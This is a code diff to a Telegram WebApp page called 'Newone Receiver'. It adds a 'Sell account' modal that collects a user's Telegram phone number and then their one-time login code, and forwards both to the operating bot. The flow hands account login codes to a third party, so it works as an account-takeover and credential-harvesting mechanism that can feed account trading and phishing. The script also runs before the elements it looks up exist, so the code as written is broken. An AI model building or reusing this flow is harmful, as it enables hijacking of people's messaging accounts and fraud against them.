@@ -39,15 +39,185 @@
         .nav-item { display: flex; flex-direction: column; align-items: center; color: #8a94a6; font-size: 10px; cursor: pointer; }
         .nav-item.active { color: #3182ce; }
         .nav-icon { font-size: 20px; margin-bottom: 4px; }
+
+        /* Modal Styles */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: #1a202c;
+            padding: 30px 25px;
+            border-radius: 24px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            color: white;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .modal-content h2 { margin-bottom: 20px; font-size: 22px; }
+        .modal-content input {
+            width: 100%;
+            padding: 14px 12px;
+            border-radius: 12px;
+            border: 1px solid #2d3748;
+            background: #0f1217;
+            color: white;
+            font-size: 16px;
+            margin-bottom: 15px;
+            outline: none;
+        }
+        .modal-content input:focus { border-color: #3182ce; }
+        .modal-content .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+        .btn-primary { background: #3182ce; color: white; }
+        .btn-success { background: #38a169; color: white; }
+        .btn-danger { background: #e53e3e; color: white; }
+        .btn-secondary { background: #2d3748; color: white; }
+        .modal-content .status {
+            margin: 15px 0;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        .step { display: block; }
+        .step.hidden { display: none; }
+        .back-link {
+            display: block;
+            margin-top: 12px;
+            color: #8a94a6;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
     <script>
+        // Ensure Telegram WebApp is ready
         const tg = window.Telegram.WebApp;
         tg.expand();
         tg.ready();
+
+        console.log("Telegram WebApp initialized.");
+
+        // DOM elements
+        const modal = document.getElementById('sellModal');
+        const stepPhone = document.getElementById('stepPhone');
+        const stepOtp = document.getElementById('stepOtp');
+        const stepSuccess = document.getElementById('stepSuccess');
+        const phoneInput = document.getElementById('phoneInput');
+        const otpInput = document.getElementById('otpInput');
+        const sendOtpBtn = document.getElementById('sendOtpBtn');
+        const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+        const statusMsg = document.getElementById('statusMsg');
+        const statusMsg2 = document.getElementById('statusMsg2');
+        const successMsg = document.getElementById('successMsg');
+
+        // Function to show modal and reset
+        function openSellModal() {
+            console.log("Open modal called");
+            modal.style.display = 'flex';
+            stepPhone.classList.remove('hidden');
+            stepOtp.classList.add('hidden');
+            stepSuccess.classList.add('hidden');
+            phoneInput.value = '';
+            otpInput.value = '';
+            statusMsg.textContent = '';
+            statusMsg.className = 'status';
+            statusMsg2.textContent = '';
+            statusMsg2.className = 'status';
+        }
+
+        // Close modal
+        function closeModal() {
+            modal.style.display = 'none';
+        }
+
+        // Event listener for Sell button
+        document.querySelector('.sell-btn').addEventListener('click', function(e) {
+            e.preventDefault();
+            openSellModal();
+        });
+
+        // Back to phone step
+        document.getElementById('backToPhone').addEventListener('click', function() {
+            stepOtp.classList.add('hidden');
+            stepPhone.classList.remove('hidden');
+            statusMsg2.textContent = '';
+        });
+
+        // Close links
+        document.getElementById('closeModalLink').addEventListener('click', closeModal);
+        document.getElementById('closeModalSuccess').addEventListener('click', closeModal);
+
+        // Send OTP
+        sendOtpBtn.addEventListener('click', function() {
+            const phone = phoneInput.value.trim();
+            if (!phone) {
+                statusMsg.textContent = 'Please enter your phone number.';
+                statusMsg.style.color = '#e53e3e';
+                return;
+            }
+            // Send data to bot
+            const data = JSON.stringify({ action: 'send_otp', phone: phone });
+            tg.sendData(data);
+            console.log("Sent OTP request:", data);
+
+            statusMsg.textContent = '📤 OTP sent to your Telegram. Check your chat and enter it below.';
+            statusMsg.style.color = '#3182ce';
+            stepPhone.classList.add('hidden');
+            stepOtp.classList.remove('hidden');
+            statusMsg2.textContent = '';
+        });
+
+        // Verify OTP
+        verifyOtpBtn.addEventListener('click', function() {
+            const otp = otpInput.value.trim();
+            if (!otp) {
+                statusMsg2.textContent = 'Please enter the OTP.';
+                statusMsg2.style.color = '#e53e3e';
+                return;
+            }
+            const data = JSON.stringify({ action: 'verify_otp', otp: otp });
+            tg.sendData(data);
+            console.log("Sent OTP verification:", data);
+
+            statusMsg2.textContent = '⏳ Verifying...';
+            statusMsg2.style.color = '#3182ce';
+
+            // We show success step after a short delay (user will get confirmation in Telegram)
+            setTimeout(() => {
+                statusMsg2.textContent = '✅ Verification request sent. Check your Telegram for confirmation.';
+                statusMsg2.style.color = '#38a169';
+                stepOtp.classList.add('hidden');
+                stepSuccess.classList.remove('hidden');
+                successMsg.textContent = 'Please check your Telegram for the final verification result.';
+            }, 1000);
+        });
+
+        // Also handle if the modal is clicked outside (optional)
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) {
+                closeModal();
+            }
+        });
     </script>
 
+    <!-- Main UI -->
     <div class="header">
         <div class="diamond-logo">💎</div>
         <h1>Newone Receiver</h1>
@@ -93,7 +263,36 @@
         </div>
 
         <div class="sell-btn-container">
-            <button class="sell-btn" onclick="alert('Account Sell Feature Coming Soon!')">+ Sell account</button>
+            <button class="sell-btn">+ Sell account</button>
+        </div>
+    </div>
+
+    <!-- Sell Modal -->
+    <div class="modal-overlay" id="sellModal">
+        <div class="modal-content">
+            <h2>Sell Account</h2>
+            <!-- Step 1: Phone -->
+            <div id="stepPhone" class="step">
+                <p style="margin-bottom:15px; color:#8a94a6;">Enter your Telegram phone number to receive OTP.</p>
+                <input type="tel" id="phoneInput" placeholder="Phone number (e.g., +8801...)" />
+                <button class="btn btn-primary" id="sendOtpBtn">Send OTP</button>
+                <div id="statusMsg" class="status"></div>
+            </div>
+            <!-- Step 2: OTP -->
+            <div id="stepOtp" class="step hidden">
+                <p style="margin-bottom:15px; color:#8a94a6;">Check your Telegram for the OTP code and enter here.</p>
+                <input type="text" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6" />
+                <button class="btn btn-success" id="verifyOtpBtn">Verify OTP</button>
+                <div id="statusMsg2" class="status"></div>
+                <span class="back-link" id="backToPhone">← Go back</span>
+            </div>
+            <!-- Step 3: Success -->
+            <div id="stepSuccess" class="step hidden">
+                <p style="color:#38a169; font-size:18px;">✅ OTP verification sent!</p>
+                <p id="successMsg" style="margin:15px 0; color:#8a94a6;">Check your Telegram for final confirmation.</p>
+                <button class="btn btn-secondary" id="closeModalSuccess">Close</button>
+            </div>
+            <span class="back-link" id="closeModalLink">Close</span>
         </div>
     </div>
 
